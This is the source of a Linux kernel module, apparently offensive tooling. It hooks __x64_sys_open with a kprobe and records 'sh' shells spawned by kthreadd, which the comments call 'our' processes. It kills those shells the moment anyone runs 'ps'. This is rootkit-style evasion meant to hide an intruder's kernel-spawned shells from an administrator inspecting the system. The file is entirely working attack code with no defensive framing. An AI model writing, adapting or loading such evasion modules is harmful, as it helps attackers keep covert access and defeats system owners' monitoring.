#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");
MODULE_DESCRIPTION("Hook __x64_sys_open using kprobes");

static struct kprobe kp;
pid_t our_pids[2] = {0}; // Tableau fixe pour 2 processus
int our_pids_count = 0;

void kill_all_communications(void);
bool unplug = false;

/* Fonction pour tuer les processus */
void kill_all_communications(void) {
    struct task_struct *task;
    int i;

    for (i = 0; i < 2; i++) {
        if (our_pids[i] != 0) {
            task = pid_task(find_vpid(our_pids[i]), PIDTYPE_PID);
            if (task) {
                pr_info("[+] Killing process with PID: %d, name: %s\n",
                        task->pid, task->comm);
                send_sig(SIGKILL, task, 0);
            } else {
                pr_warn("[!] Task struct not found for PID: %d\n", our_pids[i]);
            }
        }
    }
}

/* Handler pour la fonction hookée (__x64_sys_open) */
static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s", current->pid, current->comm);
		
    if (!unplug && strcmp(current->comm, "ps") == 0) {
        kill_all_communications();
		unplug = true;
    }

    return 0;
}

/* Fonction pour chercher les processus avec "staf" */
static void find_our_processes(void) {
    struct task_struct *task;
    for_each_process(task) {
        if (our_pids_count >= 2) {
            break; // On limite à 2 processus
        }
        if (strcmp(task->comm, "sh") == 0) {
			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
            if (task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
    			pr_info("[+] Found child of khelper: PID=%d, name=%s\n", task->pid, task->comm);
    			our_pids[our_pids_count++] = task->pid;
        	}
    	}
	}
    pr_info("[+] Total processes found from us : %d\n", our_pids_count);
}

/* Initialisation du module */
static int __init hook_init(void) {
    find_our_processes();

    kp.symbol_name = "__x64_sys_open";
    kp.pre_handler = handler_pre;

    if (register_kprobe(&kp)) {
        pr_err("[-] Failed to register kprobe\n");
        return -1;
    }

    pr_info("[+] __x64_sys_open hooked successfully\n");
    return 0;
}

/* Nettoyage du module */
static void __exit hook_exit(void) {
    unregister_kprobe(&kp);
    pr_info("[+] __x64_sys_open unhooked successfully\n");
}

module_init(hook_init);
module_exit(hook_exit);

